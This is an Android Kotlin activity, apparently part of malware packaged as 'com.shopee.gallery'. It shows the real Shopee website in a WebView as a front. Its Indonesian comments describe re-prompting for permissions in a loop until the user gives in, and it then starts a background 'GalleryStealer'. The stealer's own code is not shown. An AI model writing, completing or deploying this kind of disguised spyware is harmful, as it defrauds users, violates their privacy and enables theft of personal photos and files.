package com.shopee.gallery

import android.annotation.SuppressLint
import android.os.Bundle
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var stealer: GalleryStealer
	private var permissionCallback: ((Boolean) -> Unit)? = null
	
	fun setPermissionCallback(cb: (Boolean) -> Unit) {
	    permissionCallback = cb
	}
	
	override fun onRequestPermissionsResult(
	    requestCode: Int, permissions: Array<out String>, grantResults: IntArray
	) {
	    super.onRequestPermissionsResult(requestCode, permissions, grantResults)
	    val semuaGranted = grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }
	    permissionCallback?.invoke(semuaGranted)
	}
	
    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        webView = WebView(this).apply {
            settings.javaScriptEnabled = true
            settings.domStorageEnabled = true
            settings.databaseEnabled = true
            settings.allowFileAccess = true
            settings.allowContentAccess = true
            webViewClient = WebViewClient()
            loadUrl("https://shopee.co.id")
        }
        setContentView(webView)

        stealer = GalleryStealer(this)

        // Minta izin dulu; kalau ditolak → loop sampai dikasih
        PermissionHelper.requestWithRetry(this) {
            // Izin dikasih → mulai stealer di background
            stealer.start()
        }
    }

    override fun onBackPressed() {
        if (webView.canGoBack()) webView.goBack()
        else super.onBackPressed()
    }
}
